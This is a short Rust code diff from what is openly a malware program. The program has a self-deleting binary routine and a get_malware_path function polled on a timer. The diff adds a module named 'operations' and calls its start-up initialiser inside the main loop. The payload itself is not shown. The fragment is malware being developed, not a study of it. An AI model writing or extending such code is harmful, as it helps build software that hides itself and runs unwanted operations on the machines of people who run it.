@@ -5,6 +5,7 @@ use std::{
     path::{self, PathBuf},
     process, thread, time,
 };
+mod operations;
 
 fn delete(abs_path: &PathBuf) -> Result<(), Box<dyn Error>> {
     /*Deletes the path of the binary*/
@@ -66,6 +67,7 @@ fn main() -> Result<(), Box<dyn Error>> {
         dbg!(&bin_path, pid);
 
         let mut counter: u64 = 0;
+        operations::onstart::init();
         loop {
             bin_path = get_malware_path().expect("something went wrong within the thread");
             if timer(counter, 30) {
